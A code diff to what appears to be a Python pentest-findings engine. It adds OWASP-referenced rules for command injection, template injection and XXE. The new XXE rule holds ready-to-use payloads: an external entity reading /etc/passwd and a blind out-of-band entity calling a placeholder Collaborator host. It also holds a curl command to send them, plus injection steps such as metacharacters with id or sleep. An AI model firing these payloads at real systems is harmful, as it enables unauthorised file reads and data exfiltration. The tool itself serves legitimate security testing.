@@ -36,6 +36,7 @@ REFS = {
     "lfi": [{"t": "WSTG-ATHZ-01 · Path Traversal / LFI", "u": f"{PS}/file-path-traversal"}],
     "cmdi": [{"t": "WSTG-INPV-12 · OS Command Injection", "u": f"{PS}/os-command-injection"}],
     "ssti": [{"t": "WSTG-INPV-18 · SSTI", "u": f"{PS}/server-side-template-injection"}],
+    "xxe": [{"t": "WSTG-INPV-07 · XXE", "u": f"{PS}/xxe"}],
     "cors": [{"t": "WSTG-CLNT-07 · CORS", "u": f"{PS}/cors"}],
     "csrf": [{"t": "WSTG-SESS-05 · CSRF", "u": f"{PS}/csrf"}],
     "clickjacking": [{"t": "WSTG-CLNT-09 · Clickjacking", "u": f"{PS}/clickjacking"}],
@@ -70,6 +71,7 @@ PARAMS = {
     "ssrf": ["url", "uri", "path", "dest", "redirect", "callback", "domain", "feed", "host", "target"],
     "lfi": ["file", "path", "page", "include", "doc", "document", "template", "folder", "download"],
     "cmdi": ["cmd", "exec", "command", "ping", "query", "host", "ip", "domain"],
+    "ssti": ["name", "search", "q", "query", "message", "email", "template", "greeting"],
 }
 
 # ── payload libraries (copy-ready; benign-first) ────────────────────────────
@@ -492,6 +494,24 @@ def _rule_param_injections(recon: dict) -> Iterable[dict]:
              "Try encoding and null-byte/php filter variants if the naive payload is filtered."],
             ["lfi"], ["lfi", "traversal"], ["Burp Suite", "curl"],
         )
+        yield _param_finding(
+            base, "cmdi", "OS command injection surface (cmd/host/ip params)", "Injection", "WSTG-INPV-12",
+            "HIGH", 36,
+            "Parameters passed to a shell (ping, nslookup, converters, exporters) may allow OS command execution.",
+            ["Append a shell metacharacter (; | & `$()`) plus a benign command like id, or ping your Collaborator.",
+             "Look for command output in the response, or an out-of-band DNS/HTTP callback (blind).",
+             "If neither, confirm with a timing payload (sleep 5) and measure the delay."],
+            ["cmdi"], ["cmdi", "injection"], ["Burp Collaborator", "curl"],
+        )
+        yield _param_finding(
+            base, "ssti", "Server-side / client-side template injection surface", "Injection", "WSTG-INPV-18",
+            "HIGH", 36,
+            "Input rendered into a template (server engines like Jinja2/Twig/Freemarker, or client-side AngularJS) can execute expressions → RCE or XSS.",
+            ["Inject the polyglot {{7*7}} / ${7*7} / #{7*7} and look for 49 in the response.",
+             "Identify the engine from which syntax evaluates, then use the matching sandbox-escape.",
+             "For AngularJS/client-side, treat a rendered 49 as CSTI → in-browser JS execution."],
+            ["ssti"], ["ssti", "injection"], ["tplmap (manual)", "Burp Suite", "curl"],
+        )
 
 
 def _rule_paths(recon: dict) -> Iterable[dict]:
@@ -536,8 +556,9 @@ def _rule_paths(recon: dict) -> Iterable[dict]:
     ]
     for base, paths in _all_paths(recon).items():
         for full in paths:
+            low = full.lower()
             for rx, key, title, cat, wstg, sev, conf, what, how, refk, tags in catalog:
-                if rx.search(full):
+                if rx.search(low):
                     yield _finding(
                         key=f"path-{key}", title=title, category=cat, wstg=wstg, severity=sev,
                         confidence=conf, surface=full,
@@ -710,6 +731,51 @@ def _rule_host_header(recon: dict) -> Iterable[dict]:
         )
 
 
+_XML_SIGNAL = re.compile(
+    r"/(?:soap|xml|wsdl|rss|feed|xmlrpc|api|import|export|upload|ews|services|b2b)(?:/|$|\?)"
+    r"|\.xml(?:$|\?)|wsdl", re.I)
+
+
+def _rule_xxe(recon: dict) -> Iterable[dict]:
+    """XXE advisory — fires only when an XML / SOAP / API / upload signal is
+    present (content-type or a discovered path), so it stays quiet on apps that
+    never parse XML."""
+    http = recon.get("http") or {}
+    ct = ((http.get("headers") or {}).get("content-type", "") if http.get("ok") else "").lower()
+    xml_ct = "xml" in ct
+    hit_path = None
+    for _base, paths in _all_paths(recon).items():
+        for full in paths:
+            if _XML_SIGNAL.search(full):
+                hit_path = full
+                break
+        if hit_path:
+            break
+    if not (xml_ct or hit_path):
+        return
+    base = (_base_urls(recon)[:1] or [f"https://{recon.get('target','')}"])[0]
+    surface = hit_path or base
+    yield _finding(
+        key="xxe", title="XXE surface (XML / SOAP / API endpoint)", category="Injection",
+        wstg="WSTG-INPV-07", severity="HIGH", confidence=40, surface=surface,
+        evidence=("XML content-type observed on the app." if xml_ct else f"XML/SOAP/API/upload path discovered: {hit_path}"),
+        what="Endpoints that parse XML may resolve external entities → local file read, SSRF, or blind OAST exfiltration.",
+        how=[
+            "Capture a request that sends XML (or flip Content-Type to application/xml on a JSON endpoint and see if it still parses).",
+            "Inject a DOCTYPE with an external entity that reads file:///etc/passwd and check if it reflects.",
+            "If nothing reflects, use a blind out-of-band entity pointing at your Collaborator (OAST) to confirm.",
+        ],
+        payloads=[
+            '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]><r>&x;</r>',
+            '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "http://YOUR-COLLABORATOR-ID.oastify.com/x">]><r>&x;</r>',
+        ],
+        tools=["Burp Suite", "Burp Collaborator", "curl"],
+        curl_steps=[{"desc": "POST an XML body carrying an external entity",
+                     "cmd": f"curl -sS -k -X POST -H 'Content-Type: application/xml' --data-binary @xxe.xml {_sq(surface)}"}],
+        ref_keys=["xxe", "ssrf"], tags=["xxe", "injection"],
+    )
+
+
 RULES = [
     _rule_security_headers,
     _rule_cors,
@@ -723,6 +789,7 @@ RULES = [
     _rule_nuclei,
     _rule_idor,
     _rule_host_header,
+    _rule_xxe,
 ]
 
 
